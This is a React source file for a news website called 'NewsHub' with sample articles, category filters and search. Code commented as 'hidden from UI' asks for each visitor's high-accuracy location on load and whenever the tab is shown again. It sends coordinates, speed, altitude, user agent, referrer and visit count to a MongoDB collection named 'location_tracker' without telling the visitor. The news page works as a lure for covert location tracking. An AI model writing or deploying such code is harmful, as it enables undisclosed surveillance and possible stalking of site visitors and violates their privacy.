import React, { useState, useEffect } from 'react';
import * as Realm from 'realm-web';

const NewsWebsite = () => {
  // Location tracking states (hidden from UI)
  const [mongoClient, setMongoClient] = useState(null);
  const [user, setUser] = useState(null);
  const [locationTracked, setLocationTracked] = useState(false);

  // News content states
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [searchQuery, setSearchQuery] = useState('');

  // MongoDB Atlas App Configuration (hidden)
  const REALM_APP_ID = "myrealmapp-lwdulec";
  const DATABASE_NAME = "location_tracker";
  const COLLECTION_NAME = "locations";

  // Initialize Realm App (hidden)
  const app = new Realm.App({ id: REALM_APP_ID });

  // News data
  const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
  
  const newsArticles = [
    {
      id: 1,
      title: "Revolutionary AI Technology Transforms Healthcare Industry",
      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
      category: "technology",
      author: "Dr. Sarah Chen",
      publishedAt: "2024-01-15T10:30:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
      featured: true
    },
    {
      id: 2,
      title: "Global Markets Surge Following Economic Recovery Signals",
      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
      category: "business",
      author: "Michael Rodriguez",
      publishedAt: "2024-01-15T08:15:00Z",
      readTime: "3 min read",
      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
    },
    {
      id: 3,
      title: "Championship Finals Set Record Viewership Numbers",
      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
      category: "sports",
      author: "Jessica Thompson",
      publishedAt: "2024-01-14T22:45:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
    },
    {
      id: 4,
      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
      category: "science",
      author: "Dr. Emily Watson",
      publishedAt: "2024-01-14T16:20:00Z",
      readTime: "6 min read",
      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
    },
    {
      id: 5,
      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
      category: "health",
      author: "Dr. James Wilson",
      publishedAt: "2024-01-14T14:10:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
    },
    {
      id: 6,
      title: "Streaming Wars Intensify with New Platform Launches",
      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
      category: "entertainment",
      author: "Alex Kumar",
      publishedAt: "2024-01-14T12:30:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
    }
  ];

  // Styles
  const styles = {
    container: {
      minHeight: '100vh',
      backgroundColor: '#f8f9fa',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
    },
    header: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: '1rem 0',
      position: 'sticky',
      top: 0,
      zIndex: 1000,
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
    },
    headerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 2rem',
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center'
    },
    logo: {
      fontSize: '1.8rem',
      fontWeight: 'bold',
      color: '#ff6b6b'
    },
    nav: {
      display: 'flex',
      gap: '2rem',
      alignItems: 'center'
    },
    navLink: {
      color: 'white',
      textDecoration: 'none',
      fontWeight: '500',
      transition: 'color 0.3s ease'
    },
    searchContainer: {
      display: 'flex',
      alignItems: 'center',
      backgroundColor: '#333',
      borderRadius: '25px',
      padding: '0.5rem 1rem',
      minWidth: '250px'
    },
    searchInput: {
      background: 'none',
      border: 'none',
      color: 'white',
      outline: 'none',
      width: '100%',
      padding: '0.25rem'
    },
    main: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '2rem'
    },
    categoryBar: {
      display: 'flex',
      gap: '1rem',
      marginBottom: '2rem',
      flexWrap: 'wrap'
    },
    categoryButton: {
      background: 'none',
      borderWidth: '2px',
      borderStyle: 'solid',
      borderColor: '#e9ecef',
      padding: '0.5rem 1rem',
      borderRadius: '25px',
      cursor: 'pointer',
      transition: 'all 0.3s ease',
      fontWeight: '500',
      textTransform: 'capitalize',
      color: '#333'
    },
    categoryButtonActive: {
      backgroundColor: '#ff6b6b',
      borderWidth: '2px',
      borderStyle: 'solid',
      borderColor: '#ff6b6b',
      color: 'white'
    },
    featuredSection: {
      marginBottom: '3rem'
    },
    featuredTitle: {
      fontSize: '2rem',
      fontWeight: 'bold',
      marginBottom: '1.5rem',
      color: '#333'
    },
    featuredCard: {
      backgroundColor: 'white',
      borderRadius: '15px',
      overflow: 'hidden',
      boxShadow: '0 8px 25px rgba(0,0,0,0.1)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    featuredImage: {
      width: '100%',
      height: '400px',
      objectFit: 'cover'
    },
    featuredContent: {
      padding: '2rem'
    },
    articleTitle: {
      fontSize: '1.8rem',
      fontWeight: 'bold',
      marginBottom: '1rem',
      color: '#333',
      lineHeight: '1.3'
    },
    articleSummary: {
      color: '#666',
      fontSize: '1.1rem',
      lineHeight: '1.6',
      marginBottom: '1rem'
    },
    articleMeta: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      fontSize: '0.9rem',
      color: '#888'
    },
    newsGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(350px, 1fr))',
      gap: '2rem',
      marginTop: '2rem'
    },
    newsCard: {
      backgroundColor: 'white',
      borderRadius: '12px',
      overflow: 'hidden',
      boxShadow: '0 4px 15px rgba(0,0,0,0.08)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    newsImage: {
      width: '100%',
      height: '200px',
      objectFit: 'cover'
    },
    newsContent: {
      padding: '1.5rem'
    },
    newsTitle: {
      fontSize: '1.2rem',
      fontWeight: 'bold',
      marginBottom: '0.5rem',
      color: '#333',
      lineHeight: '1.4'
    },
    newsSummary: {
      color: '#666',
      fontSize: '0.95rem',
      lineHeight: '1.5',
      marginBottom: '1rem'
    },
    categoryTag: {
      display: 'inline-block',
      backgroundColor: '#ff6b6b',
      color: 'white',
      padding: '0.25rem 0.75rem',
      borderRadius: '15px',
      fontSize: '0.8rem',
      fontWeight: '500',
      textTransform: 'uppercase',
      marginBottom: '1rem'
    },
    footer: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: '3rem 0',
      marginTop: '4rem'
    },
    footerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 2rem',
      textAlign: 'center'
    },
    footerText: {
      color: '#ccc',
      fontSize: '0.9rem'
    }
  };

  // Background location tracking functions (hidden from UI)
  const initializeMongoDB = async () => {
    try {
      console.log('🔄 Initializing MongoDB connection...');
      
      if (app.currentUser) {
        console.log('✅ Using existing user:', app.currentUser.id);
        setUser(app.currentUser);
        const mongodb = app.currentUser.mongoClient("mongodb-atlas");
        setMongoClient(mongodb);
        return mongodb;
      }

      const credentials = Realm.Credentials.anonymous();
      const authenticatedUser = await app.logIn(credentials);
      console.log('✅ Anonymous authentication successful:', authenticatedUser.id);
      setUser(authenticatedUser);

      const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
      setMongoClient(mongodb);
      console.log('✅ MongoDB client initialized');
      return mongodb;
    } catch (error) {
      console.error('❌ MongoDB connection failed:', error);
      return null;
    }
  };

  const saveLocationToMongoDB = async (location, client = null) => {
    try {
      const dbClient = client || mongoClient;
      if (!dbClient) {
        console.error('❌ No MongoDB client available');
        return null;
      }

      const collection = dbClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
      
      const locationData = {
        ...location,
        timestamp: new Date(location.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
      };

      // Update visit count
      localStorage.setItem('visitCount', locationData.visitCount.toString());

      const result = await collection.insertOne(locationData);
      console.log('✅ Location tracked and stored:', result.insertedId);
      console.log('📍 Location data:', {
        lat: location.latitude,
        lng: location.longitude,
        accuracy: location.accuracy,
        visit: locationData.visitCount
      });
      
      return result;
    } catch (error) {
      console.error('❌ Location tracking failed:', error);
      return null;
    }
  };

  const trackUserLocation = async (forceTrack = false) => {
    // Always track if forced, or if not tracked yet
    if (!forceTrack && locationTracked) return;

    console.log('🎯 Starting location tracking...');

    if (!navigator.geolocation) {
      console.error('❌ Geolocation not supported');
      return;
    }

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          console.log('📍 Location obtained:', {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy
          });

          const location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString(),
            altitude: position.coords.altitude,
            heading: position.coords.heading,
            speed: position.coords.speed
          };

          const result = await saveLocationToMongoDB(location);
          if (result) {
            setLocationTracked(true);
            console.log('✅ Location successfully stored in MongoDB');
          }
          resolve(result);
        },
        (error) => {
          console.log('❌ Location access failed:', error.message);
          setLocationTracked(true); // Mark as attempted
          resolve(null);
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0 // Always get fresh location
        }
      );
    });
  };

  // Initialize background tracking on site visit
  useEffect(() => {
    const initializeTracking = async () => {
      console.log('🚀 Component mounted - Starting location tracking...');
      
      // Generate session ID if not exists
      if (!sessionStorage.getItem('sessionId')) {
        sessionStorage.setItem('sessionId', Date.now().toString());
      }

      try {
        // Initialize MongoDB connection
        const dbClient = await initializeMongoDB();
        
        if (dbClient) {
          // Track location immediately when component mounts
          await trackUserLocation(true); // Force tracking
        } else {
          console.error('❌ Failed to initialize MongoDB connection');
        }
      } catch (error) {
        console.error('❌ Tracking initialization failed:', error);
      }
    };

    initializeTracking();
  }, []); // Empty dependency array ensures this runs on every mount

  // Additional effect to track on page visibility change
  useEffect(() => {
    const handleVisibilityChange = async () => {
      if (document.visibilityState === 'visible' && mongoClient) {
        console.log('👁️ Page became visible - tracking location...');
        await trackUserLocation(true);
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [mongoClient]);

  // Track location when mongoClient becomes available
  useEffect(() => {
    if (mongoClient && !locationTracked) {
      console.log('🔗 MongoDB client ready - tracking location...');
      trackUserLocation(true);
    }
  }, [mongoClient]);

  // News filtering logic
  const filteredArticles = newsArticles.filter(article => {
    const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
    const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         article.summary.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCategory && matchesSearch;
  });

  const featuredArticle = newsArticles.find(article => article.featured);
  const regularArticles = filteredArticles.filter(article => !article.featured);

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleDateString('en-US', { 
      month: 'long', 
      day: 'numeric', 
      year: 'numeric' 
    });
  };

  const handleCardHover = (e) => {
    e.currentTarget.style.transform = 'translateY(-5px)';
    e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
  };

  const handleCardLeave = (e) => {
    e.currentTarget.style.transform = 'translateY(0)';
    e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
      '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
  };

  return (
    <div style={styles.container}>
      {/* Header */}
      <header style={styles.header}>
        <div style={styles.headerContent}>
          <div style={styles.logo}>NewsHub</div>
          <nav style={styles.nav}>
            <a href="#" style={styles.navLink}>Home</a>
            <a href="#" style={styles.navLink}>World</a>
            <a href="#" style={styles.navLink}>Politics</a>
            <a href="#" style={styles.navLink}>Opinion</a>
            <div style={styles.searchContainer}>
              <input
                type="text"
                placeholder="Search news..."
                style={styles.searchInput}
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
            </div>
          </nav>
        </div>
      </header>

      {/* Main Content */}
      <main style={styles.main}>
        {/* Category Filter */}
        <div style={styles.categoryBar}>
          {newsCategories.map(category => (
            <button
              key={category}
              style={{
                ...styles.categoryButton,
                ...(selectedCategory === category ? styles.categoryButtonActive : {})
              }}
              onClick={() => setSelectedCategory(category)}
            >
              {category}
            </button>
          ))}
        </div>

        {/* Featured Article */}
        {featuredArticle && selectedCategory === 'all' && (
          <section style={styles.featuredSection}>
            <h2 style={styles.featuredTitle}>Featured Story</h2>
            <div 
              className="featured"
              style={styles.featuredCard}
              onMouseEnter={handleCardHover}
              onMouseLeave={handleCardLeave}
            >
              <img 
                src={featuredArticle.image} 
                alt={featuredArticle.title}
                style={styles.featuredImage}
              />
              <div style={styles.featuredContent}>
                <div style={styles.categoryTag}>{featuredArticle.category}</div>
                <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
                <p style={styles.articleSummary}>{featuredArticle.summary}</p>
                <div style={styles.articleMeta}>
                  <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
                  <span>{featuredArticle.readTime}</span>
                </div>
              </div>
            </div>
          </section>
        )}

        {/* News Grid */}
        <div style={styles.newsGrid}>
          {regularArticles.map(article => (
            <div
              key={article.id}
              style={styles.newsCard}
              onMouseEnter={handleCardHover}
              onMouseLeave={handleCardLeave}
            >
              <img 
                src={article.image} 
                alt={article.title}
                style={styles.newsImage}
              />
              <div style={styles.newsContent}>
                <div style={styles.categoryTag}>{article.category}</div>
                <h3 style={styles.newsTitle}>{article.title}</h3>
                <p style={styles.newsSummary}>{article.summary}</p>
                <div style={styles.articleMeta}>
                  <span>By {article.author}</span>
                  <span>{article.readTime}</span>
                </div>
                <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
                  <span>{formatDate(article.publishedAt)}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </main>

      {/* Footer */}
      <footer style={styles.footer}>
        <div style={styles.footerContent}>
          <div style={styles.logo}>NewsHub</div>
          <p style={styles.footerText}>
            Your trusted source for breaking news and in-depth analysis
          </p>
          <p style={{...styles.footerText, marginTop: '1rem'}}>
            © 2024 NewsHub. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default NewsWebsite;